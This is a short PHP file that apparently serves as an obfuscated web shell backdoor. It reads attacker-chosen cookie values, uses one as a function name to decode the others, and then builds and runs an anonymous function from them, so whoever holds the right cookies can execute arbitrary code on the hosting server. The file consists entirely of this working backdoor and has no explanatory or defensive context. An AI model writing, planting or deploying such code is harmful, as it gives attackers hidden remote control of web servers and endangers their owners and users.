 <?php

$ewux=$_COOKIE;
$xjfng=$ewux[ryre];
if($xjfng){
	$nej=$xjfng($ewux[hzkn]);$fvtk=$xjfng($ewux[rqua]);$gbubg=$nej("",$fvtk);$gbubg();
}